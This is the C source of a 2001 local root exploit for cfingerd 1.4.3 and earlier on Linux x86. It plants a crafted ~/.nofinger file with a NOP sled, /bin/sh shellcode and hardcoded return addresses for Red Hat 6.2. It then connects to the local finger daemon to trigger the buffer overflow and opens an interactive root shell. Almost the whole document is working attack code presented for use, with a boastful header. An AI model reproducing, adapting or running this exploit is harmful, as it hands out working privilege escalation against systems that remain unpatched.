/*
 * cfingerd 1.4.3 and prior Linux x86 local root exploit
 * by qitest1 10/07/2001
 *
 * This code successfully exploits the bof vulnerability found by
 * Steven Van Acker <deepstar@ulyssis.org> and recently posted to
 * bugtraq. If the ALLOW_LINE_PARSING option is set, and it is set
 * by default, the bof simply occurs when reading the ~/.nofinger
 * file. If cfingerd is called by inetd as root, a root shell will be
 * spawned. But it is quite funny that the authors of cfingerd in the
 * README almost seem to encourage people to set inetd.conf for
 * calling cfingerd as root.     
 *
 * Greets: my friends on #sikurezza@Undernet
 *	   jtripper: hi man, play_the_game with me! =)
 *	   warson and warex
 *
 * Fuck:   fender'/hcezar: I want your respect..
 *
 * have fun with this 0x69 local toy! =) 
 */

#include <stdio.h>
#include <pwd.h>
#include <sys/types.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netdb.h>

#define	RETPOS		84
#define LOCALHOST	"localhost"
#define	FINGERD_PORT	79

  struct targ
    {
      int                  def;
      char                 *descr;
      u_long    	   retaddr;
    };

  struct targ target[]=
    {                   
      {0, "Red Hat 6.2 with cfingerd 1.4.0 from tar.gz", 0xbffff660},
      {1, "Red Hat 6.2 with cfingerd 1.4.1 from tar.gz", 0xbffff661},
      {2, "Red Hat 6.2 with cfingerd 1.4.2 from tar.gz", 0xbffff662},
      {3, "Red Hat 6.2 with cfingerd 1.4.3 from tar.gz", 0xbffff663},
      {69, NULL, 0}
    };

  char shellcode[] =			/* Aleph1 code */
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

  int    sel = 0, offset = 0;

  void	play_the_game(u_long retaddr, struct passwd *user);
  int	sockami(char *host, int port);
  void	shellami(int sock);
  void  usage(char *progname);
  
int
main(int argc, char **argv)
{
  int			sock, cnt;
  uid_t                 euid;
  char			sbuf[256];
  struct passwd		*user;

  printf("\n  cfingerd 1.4.3 and prior exploit by qitest1\n\n");

  while((cnt = getopt(argc,argv,"t:o:h")) != EOF)
    {
   switch(cnt)
        {
   case 't':
     sel = atoi(optarg);
     break;
   case 'o':
     offset = atoi(optarg);
     break;
   case 'h':
     usage(argv[0]);
     break;
        }
    }

  euid = geteuid();
  user = (struct passwd *)getpwuid(euid);

  printf("+User: %s\n  against: %s\n", user->pw_name, target[sel].descr);
  target[sel].retaddr += offset;
  printf("+Using: retaddr = %p...\n  ok\n", target[sel].retaddr);

  play_the_game(target[sel].retaddr, user);

  sock = sockami(LOCALHOST, FINGERD_PORT);
  sprintf(sbuf, "%s\n", user->pw_name);
  send(sock, sbuf, strlen(sbuf), 0);

  printf("+Waiting for a shell...\n  0x69 =)\n");
  sleep(1);
  shellami(sock);  
}

void
play_the_game(u_long retaddr, struct passwd *user)
{
  char			zbuf[256], nofinger_path[256];
  int			i, n = 0; 
  FILE 			*nofinger_file;

  memset(zbuf, '\x90', sizeof(zbuf));
  for(i = RETPOS - strlen(shellcode); i < RETPOS; i++)
        zbuf[i] = shellcode[n++];
  
  zbuf[RETPOS + 0] = (u_char) (retaddr & 0x000000ff);
  zbuf[RETPOS + 1] = (u_char)((retaddr & 0x0000ff00) >> 8);
  zbuf[RETPOS + 2] = (u_char)((retaddr & 0x00ff0000) >> 16);
  zbuf[RETPOS + 3] = (u_char)((retaddr & 0xff000000) >> 24);
  zbuf[RETPOS + 4] = '\x00';

  sprintf(nofinger_path, "%s/.nofinger", user->pw_dir);
  nofinger_file = fopen(nofinger_path, "w");
  printf("+Writing ~/.nofinger...\n");
  fprintf(nofinger_file, "$%s\n", zbuf);
  printf("  done\n");
  fclose(nofinger_file);

  return;
}

int
sockami(char *host, int port)
{
struct sockaddr_in address;
struct hostent *hp;
int sock;

  sock = socket(AF_INET, SOCK_STREAM, 0);
  if(sock == -1)
        {
          perror("socket()");
          exit(-1);
        }
 
  hp = gethostbyname(host);
  if(hp == NULL)
        {
          perror("gethostbyname()");
          exit(-1);
        }

  memset(&address, 0, sizeof(address));
  memcpy((char *) &address.sin_addr, hp->h_addr, hp->h_length);
  address.sin_family = AF_INET;
  address.sin_port = htons(port);

  if(connect(sock, (struct sockaddr *) &address, sizeof(address)) == -1)
        {
          perror("connect()");
          exit(-1);
        }

  return(sock);
}


void
shellami(int sock)
{
  int             n;
  char            recvbuf[1024], *cmd = "id; uname -a\n";
  fd_set          rset;

  send(sock, cmd, strlen(cmd), 0);

  while (1)
    {
      FD_ZERO(&rset);
      FD_SET(sock, &rset);
      FD_SET(STDIN_FILENO, &rset);
      select(sock+1, &rset, NULL, NULL, NULL);
      if(FD_ISSET(sock, &rset))
        {
          n = read(sock, recvbuf, 1024);
          if (n <= 0)
            {
              printf("Connection closed by foreign host.\n");
              exit(0);
            }
          recvbuf[n] = 0;
          printf("%s", recvbuf);
        }
      if (FD_ISSET(STDIN_FILENO, &rset))
        {
          n = read(STDIN_FILENO, recvbuf, 1024);
          if (n > 0)
            {
              recvbuf[n] = 0;
              write(sock, recvbuf, n);
            }
        }
    }
  return;
}

void
usage(char *progname)
{
  int  i = 0;
  
  printf("Usage: %s [options]\n", progname);
  printf("Options:\n"
         "  -t target\n"
         "  -o offset\n"
	 "  -h (help)\n"
         "Available targets:\n");
  while(target[i].def != 69)
        { 
          printf("  %d) %s\n", target[i].def, target[i].descr);
          i++;
        } 

  exit(1);
}
